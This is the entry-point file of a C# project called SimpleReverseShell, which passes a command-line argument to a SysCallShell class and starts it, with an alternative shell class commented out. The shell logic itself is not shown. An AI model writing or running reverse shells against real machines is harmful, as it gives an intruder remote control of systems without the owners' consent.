using System.Text;
using System.Diagnostics;
using System.Net.Sockets;
using System.IO;

namespace SimpleReverseShell
{
  public class Program
  {
    public static void Main(string[] args)
    {
      //var simpleDotNetShell = new SimpleDotNetShell();
      //simpleDotNetShell.Start();

      var simplesyscallshell = new SysCallShell(args.FirstOrDefault());
      simplesyscallshell.Main(Array.Empty<string>());
    }
  }
}